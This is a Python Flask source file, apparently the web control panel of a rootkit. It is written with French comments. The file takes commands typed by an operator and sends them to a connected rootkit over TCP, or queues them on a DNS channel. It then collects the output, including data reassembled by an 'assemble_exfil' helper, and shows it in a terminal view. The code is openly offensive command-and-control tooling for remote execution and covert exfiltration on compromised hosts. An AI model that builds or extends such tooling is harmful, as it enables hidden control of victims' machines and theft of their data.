from flask import Blueprint, render_template, request, redirect, url_for
from utils.tools import (
    authenticated, rootkit_connection, command_history, connection_lock,
    last_response, last_channel, assemble_exfil, command_queue
)
from communication import send_to_server, receive_from_server
import socket

terminal_bp = Blueprint('terminal', __name__)


@terminal_bp.route('/terminal')
def terminal():
    if not authenticated:
        return redirect(url_for('auth.login'))

    return render_template(
        "terminal.html",
        response=last_response,
        history=command_history,
        last_channel=last_channel
    )


@terminal_bp.route('/send', methods=['POST'])
def send():
    global last_response, last_channel

    if not authenticated:
        return redirect(url_for('auth.login'))

    channel = request.form.get('channel', 'tcp')
    last_channel = channel
    cmd = request.form.get('command', '').strip()

    if not cmd:
        return redirect(url_for('terminal.terminal'))

    # Historique
    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
    command_history.append(command_entry)

    if channel == 'dns':
        command_queue.append(cmd)
        last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}

        out = assemble_exfil()
        if out:
            last_response = {"stdout": out, "stderr": ""}
            command_entry["stdout"] = out
        else:
            last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
            command_entry["stderr"] = last_response["stderr"]

    else:
        try:
            with connection_lock:
                send_to_server(rootkit_connection, cmd)

                if 'killcom' in cmd.lower():
                    rootkit_connection.close()
                    last_response = {"stdout": "", "stderr": "Connexion terminée."}
                    return redirect(url_for('dashboard.dashboard'))

                rootkit_connection.settimeout(3)
                chunks = []
                rootkit_connection.settimeout(1)

                while True:
                    try:
                        part = receive_from_server(rootkit_connection)
                        if not part:
                            break
                        chunks.append(part)
                    except socket.timeout:
                        break

                response = ''.join(chunks)
                stdout_marker = "stdout:"
                stderr_marker = "stderr:"

                if stdout_marker in response and stderr_marker in response:
                    start_stdout = response.index(stdout_marker) + len(stdout_marker)
                    start_stderr = response.index(stderr_marker) + len(stderr_marker)

                    stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
                    stderr_content = response[start_stderr:].strip()

                    last_response = {
                        "stdout": stdout_content,
                        "stderr": stderr_content
                    }

                    command_entry["stdout"] = stdout_content
                    command_entry["stderr"] = stderr_content

                else:
                    last_response = {"stdout": response.strip(), "stderr": ""}
                    command_entry["stdout"] = response.strip()

        except Exception as e:
            last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}

        finally:
            rootkit_connection.settimeout(None)

    return redirect(url_for('terminal.terminal'))
